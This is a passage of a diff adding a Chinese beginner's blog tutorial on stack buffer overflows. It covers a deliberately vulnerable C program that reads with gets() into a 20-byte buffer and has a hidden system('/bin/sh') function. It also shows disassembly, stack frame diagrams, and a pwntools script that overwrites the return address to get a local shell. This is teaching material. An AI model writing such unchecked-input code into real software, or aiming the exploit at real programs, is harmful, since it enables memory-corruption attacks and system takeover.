class="variable">$eip</span>   : 0x38303830 (<span class="string">"0808"</span>?)</span><br><span class="line"><span class="variable">$eflags</span>: [carry PARITY adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line"><span class="variable">$gs</span>: 0x0063  <span class="variable">$ds</span>: 0x002b  <span class="variable">$cs</span>: 0x0023  <span class="variable">$es</span>: 0x002b  <span class="variable">$fs</span>: 0x0000  <span class="variable">$ss</span>: 0x002b</span><br></pre></td></tr></table></figure>
+<p>   不难看出, 此时的<code>ebp</code>被覆盖为<code>0x33333333</code> ,<code>eip</code>被覆盖为<code>0x38303830</code>. 至此, 栈溢出完美实现!</p>
+<hr>
+<h2 id="0x30-栈溢出实战-小试牛刀"><a href="#0x30-栈溢出实战-小试牛刀" class="headerlink" title="0x30 栈溢出实战-小试牛刀"></a>0x30 栈溢出实战-小试牛刀</h2><p>首先, 先写一个有漏洞的脚本程序:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*************************************************************************</span></span><br><span class="line"><span class="comment">	&gt; File Name: stack-overflow-demo.c</span></span><br><span class="line"><span class="comment">	&gt; Author: killshadow</span></span><br><span class="line"><span class="comment">	&gt; Mail: chaceli@foxmail.com</span></span><br><span class="line"><span class="comment">	&gt; Created Time: 2018年10月07日 星期日 13时02分34秒</span></span><br><span class="line"><span class="comment"> ************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exec</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Congratulations! You have already get shell!\n"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerablefunc</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">20</span>];</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    vulnerablefunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面的程序中, <code>exec()</code>可以执行shell命令, 但是没有在主函数执行; <code>vulnerablefunc()</code>执行了一个没有判断输入字符串长度的<code>gets</code>函数, 该函数是一个危险函数(不判断输入字符串的长度), 编译时也能看得出来:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  demo gcc -m32 -fno-stack-protector stack-overflow-demo.c -o stack-overflow-demo</span><br><span class="line">stack-overflow-demo.c: In <span class="keyword">function</span> ‘<span class="built_in">exec</span>’:</span><br><span class="line">stack-overflow-demo.c:13:5: warning: implicit declaration of <span class="keyword">function</span> ‘system’ [-Wimplicit-function-declaration]</span><br><span class="line">     system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">     ^</span><br><span class="line">stack-overflow-demo.c: In <span class="keyword">function</span> ‘vulnerablefunc’:</span><br><span class="line">stack-overflow-demo.c:18:5: warning: implicit declaration of <span class="keyword">function</span> ‘gets’ [-Wimplicit-function-declaration]</span><br><span class="line">     gets(s);</span><br><span class="line">     ^</span><br><span class="line">/tmp/ccA0jCUY.o: In <span class="keyword">function</span> `vulnerablefunc<span class="string">':</span></span><br><span class="line"><span class="string">stack-overflow-demo.c:(.text+0x37): warning: the `gets'</span> <span class="keyword">function</span> is dangerous and should not be used.</span><br></pre></td></tr></table></figure>
+<p>上面编译有两个warning: 1)第一个warning提示危险的<code>system</code>函数(系统调用); 2)第二个warning就是<code>gets</code>函数了. 该命令中, <code>-fno-stack-protectotor</code>表示不开启堆栈溢出保护(不生成canary). 同时, 还可以关闭地址随机化PIE(Position Independent Executable), 如果<code>gcc -v</code>后能看到<code>--enable-default-pie</code>即为开启了PIE. 我们在编译时, 添加<code>-no-pie</code>参数即可关闭PIE.</p>
+<p>此时我们在shell下反汇编<code>objdump -d stack-overflow-demo</code>:(截取部分汇编)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">0804846b &lt;exec&gt;:</span><br><span class="line"> 804846b:	55                   	push   %ebp</span><br><span class="line"> 804846c:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 804846e:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048471:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048474:	68 60 85 04 08       	push   $0x8048560</span><br><span class="line"> 8048479:	e8 b2 fe ff ff       	call   8048330 &lt;puts@plt&gt;</span><br><span class="line"> 804847e:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048481:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048484:	68 8d 85 04 08       	push   $0x804858d</span><br><span class="line"> 8048489:	e8 b2 fe ff ff       	call   8048340 &lt;system@plt&gt;</span><br><span class="line"> 804848e:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048491:	90                   	nop</span><br><span class="line"> 8048492:	c9                   	leave  </span><br><span class="line"> 8048493:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">08048494 &lt;vulnerablefunc&gt;:</span><br><span class="line"> 8048494:	55                   	push   %ebp</span><br><span class="line"> 8048495:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048497:	83 ec 28             	sub    $0x28,%esp</span><br><span class="line"> 804849a:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 804849d:	8d 45 e4             	lea    -0x1c(%ebp),%eax # ebp-0x1c即为s的地址</span><br><span class="line"> 80484a0:	50                   	push   %eax</span><br><span class="line"> 80484a1:	e8 7a fe ff ff       	call   8048320 &lt;gets@plt&gt; # 这里调用gets函数</span><br><span class="line"> 80484a6:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 80484a9:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 80484ac:	8d 45 e4             	lea    -0x1c(%ebp),%eax</span><br><span class="line"> 80484af:	50                   	push   %eax</span><br><span class="line"> 80484b0:	e8 7b fe ff ff       	call   8048330 &lt;puts@plt&gt;</span><br><span class="line"> 80484b5:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 80484b8:	90                   	nop</span><br><span class="line"> 80484b9:	c9                   	leave  </span><br><span class="line"> 80484ba:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">080484bb &lt;main&gt;:</span><br><span class="line"> 80484bb:	8d 4c 24 04          	lea    0x4(%esp),%ecx</span><br><span class="line"> 80484bf:	83 e4 f0             	and    $0xfffffff0,%esp</span><br><span class="line"> 80484c2:	ff 71 fc             	pushl  -0x4(%ecx)</span><br><span class="line"> 80484c5:	55                   	push   %ebp</span><br><span class="line"> 80484c6:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 80484c8:	51                   	push   %ecx</span><br><span class="line"> 80484c9:	83 ec 04             	sub    $0x4,%esp</span><br><span class="line"> 80484cc:	e8 c3 ff ff ff       	call   8048494 &lt;vulnerablefunc&gt;</span><br><span class="line"> 80484d1:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line"> 80484d6:	83 c4 04             	add    $0x4,%esp</span><br><span class="line"> 80484d9:	59                   	pop    %ecx</span><br><span class="line"> 80484da:	5d                   	pop    %ebp</span><br><span class="line"> 80484db:	8d 61 fc             	lea    -0x4(%ecx),%esp</span><br><span class="line"> 80484de:	c3                   	ret    </span><br><span class="line"> 80484df:	90                   	nop</span><br></pre></td></tr></table></figure>
+<p>执行<code>gets</code>函数之前, <code>vulnerablefunc</code>的栈帧为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">        High</span><br><span class="line">+---------------------+</span><br><span class="line">|                     |</span><br><span class="line">|    Return Address   |</span><br><span class="line">|                     |</span><br><span class="line">+---------------------+</span><br><span class="line">|                     |</span><br><span class="line">|    Caller&apos;s ebp     |</span><br><span class="line">|                     |</span><br><span class="line">+---------------------+ &lt;------+ ebp</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">+---------------------+</span><br><span class="line">|   Local Variables   |</span><br><span class="line">|    (char s[20])     |</span><br><span class="line">+---------------------+ &lt;------+ s, [ebp-0x1c]</span><br><span class="line">          Low</span><br></pre></td></tr></table></figure>
+<p><code>gets</code>函数执行后, <code>vulnerablefunc</code>的栈帧为:(输入: <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaa33330808</code>)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">        High</span><br><span class="line">+---------------------+</span><br><span class="line">|                     |</span><br><span class="line">|    Return Address   |</span><br><span class="line">|    (0x38303830)     |</span><br><span class="line">+---------------------+</span><br><span class="line">|                     |</span><br><span class="line">|    Caller&apos;s ebp     |</span><br><span class="line">|    (0x33333333)     |</span><br><span class="line">+---------------------+ &lt;------+ ebp</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">+---------------------+</span><br><span class="line">|   Local Variables   |</span><br><span class="line">|      (aaaa...)      |</span><br><span class="line">+---------------------+ &lt;-------+ s, [ebp-0x1c]</span><br><span class="line">        Low</span><br></pre></td></tr></table></figure>
+<p>这里的<code>0x1c</code>是<code>char</code>型变量<code>s</code>与<code>ebp</code>的相对地址, 所以要覆盖<code>ebp</code>, 就需要构造<code>0x1c</code>个字节的payload, 后面四个字节是<code>ebp</code>的地址, 紧接着<code>ebp</code>的后面四个字节的地址便是返回地址. 因此, 如果要覆盖返回地址, 让函数弹出栈帧时弹到自己想要返回到的函数地址, 就需要先找到<strong>需要利用的函数的地址</strong>, 然后将这个地址加进payload里, 如下所示代码:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># open this elf executable file</span></span><br><span class="line">sh = process(<span class="string">'./stack-overflow-demo'</span>)</span><br><span class="line"><span class="comment"># objdump -d stack-overflow-demo, you can find "exec" function's address</span></span><br><span class="line">exec_addr = <span class="number">0x0804846B</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x1c is offset address from ebp, [ebp - 0x1c] is "s" address</span></span><br><span class="line"><span class="comment"># "aaaa" can cover ebp value</span></span><br><span class="line"><span class="comment"># return address had changed exec_addr</span></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x1c</span> + <span class="string">"aaaa"</span> + p32(exec_addr)</span><br><span class="line"><span class="comment"># print small end address</span></span><br><span class="line"><span class="keyword">print</span> p32(exec_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send payload into process</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># get interactive shell</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>执行该脚本之后, 可以获得shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  demo python stack-overflow-demo-attack.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./stack-overflow-demo'</span>: pid 20109</span><br><span class="line">k\x84\x0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak\x84\x0</span><br><span class="line">Congratulations! You have already get shell!</span><br><span class="line">$ uname -a</span><br><span class="line">Linux ks 4.15.0-36-generic <span class="comment">#39~16.04.1-Ubuntu SMP Tue Sep 25 08:59:23 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>
+<p>至此, 你的第一个栈溢出攻击的过程就完美实现啦! Keep Moving!!!</p>
+<hr>
+<h2 id="0x40-参考链接"><a href="#0x40-参考链接" class="headerlink" title="0x40 参考链接"></a>0x40 参考链接</h2><blockquote>
+<p>部分内容引自如下blog, 如有侵权立即更改本文.</p>
+</blockquote>
+<p><a href="https://wizardforcel.gitbooks.io/100-gdb-tips/content/" target="_blank" rel="noopener">100个gdb小技巧</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a></p>
+<p><a href="http://www.cnblogs.com/clover-toeic/p/3755401.html" target="_blank" rel="noopener">C语言函数调用栈(一)</a></p>
+<p><a href="http://www.cnblogs.com/clover-toeic/p/3756668.html" target="_blank" rel="noopener">C语言函数调用栈(二)</a></p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack_intro/" target="_blank" rel="noopener">栈介绍-CTF-wiki</a></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>Thanks for your appreciation<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/wechat.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Mobile Security</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Reverse</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">AOSP</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Ubuntu18.04+8x1080ti爆破环境从零搭建
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2018/09/09/NFC开发笔记/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">NFC开发笔记</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-背景知识"><span class="toc-number">1.</span> <span class="toc-text">0x10 背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-栈介绍"><span class="toc-number">1.1.</span> <span class="toc-text">0x11 栈介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x12-栈帧结构"><span class="toc-number">1.2.</span> <span class="toc-text">0x12 栈帧结构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-入栈出栈指令"><span class="toc-number">1.2.1.</span> <span class="toc-text">(1) 入栈出栈指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-参数压栈指令"><span class="toc-number">1.2.2.</span> <span class="toc-text">(2) 参数压栈指令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x13-函数调用栈"><span class="toc-number">1.3.</span> <span class="toc-text">0x13 函数调用栈</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-函数调用压栈顺序"><span class="toc-number">1.3.1.</span> <span class="toc-text">(1) 函数调用压栈顺序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-函数调用出栈顺序"><span class="toc-number">1.3.2.</span> <span class="toc-text">(2) 函数调用出栈顺序</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x14-寄存器分布"><span class="toc-number">1.4.</span> <span class="toc-text">0x14 寄存器分布</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-栈溢出原理"><span class="toc-number">2.</span> <span class="toc-text">0x20 栈溢出原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x30-栈溢出实战-小试牛刀"><span class="toc-number">3.</span> <span class="toc-text">0x30 栈溢出实战-小试牛刀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x40-参考链接"><span class="toc-number">4.</span> <span class="toc-text">0x40 参考链接</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+  
+   
+
+  
+  
+
+  
 
 
           </div>
@@ -227,9 +613,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
@@ -260,9 +646,9 @@ var _hmt = _hmt || [];
     var yiliaConfig = {
         mathjax: false,
         isHome: false,
-        isPost: false,
+        isPost: true,
         isArchive: false,
-        isTag: true,
+        isTag: false,
         isCategory: false,
         open_in_new: false,
         toc_hide_index: true,
